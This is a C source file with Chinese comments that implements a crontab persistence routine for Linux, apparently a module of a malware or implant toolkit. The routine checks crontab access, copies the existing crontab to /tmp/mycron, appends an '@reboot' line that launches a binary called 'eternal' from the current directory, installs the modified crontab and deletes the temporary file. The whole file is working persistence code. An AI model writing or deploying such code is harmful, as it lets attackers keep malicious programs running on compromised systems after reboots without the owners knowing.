#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "linux_persistence_crontab.h"

#ifdef CRONTAB_MOD
void setup_crontab_persistence() {
    printf("设置crontab持久化...\n");

    // 阶段 1: 环境和权限检查
    // 检查是否可以创建临时文件
    FILE *temp_cron = fopen("/tmp/mycron", "w+");
    if (!temp_cron) {
        perror("无法创建或写入临时crontab文件");
        return;
    }
    fclose(temp_cron); // 关闭文件，后面将重新打开以追加模式

    // 检查能否获取当前目录
    char* current_dir = getcwd(NULL, 0);
    if (!current_dir) {
        perror("无法获取当前目录");
        return;
    }

    // 检查crontab服务是否存在并且可被当前用户访问
    if (system("crontab -l > /dev/null 2>&1") != 0) {
        printf("未检测到crontab或没有权限。\n");
        free(current_dir);
        return;
    }

    // 阶段 2: 执行操作
    printf("检测到crontab存在。\n");
    const char* cron_job = "@reboot ";
    char cron_entry[512];
    snprintf(cron_entry, sizeof(cron_entry), "%s%s/eternal\n", cron_job, current_dir);
    free(current_dir);  // 完成使用后释放内存

    // 将现有的 crontab 项和新条目写入临时文件
    temp_cron = fopen("/tmp/mycron", "a"); // 重新以追加模式打开文件
    if (!temp_cron) {
        perror("无法打开临时crontab文件");
        return;
    }
    system("crontab -l >> /tmp/mycron 2>/dev/null"); // 将现有的 crontab 追加到文件中
    fprintf(temp_cron, "%s", cron_entry); // 添加新的启动条目
    fclose(temp_cron);

    // 更新crontab
    system("crontab /tmp/mycron");
    printf("持久化命令已添加到crontab。\n");
    unlink("/tmp/mycron"); // 清理临时文件
}
#endif
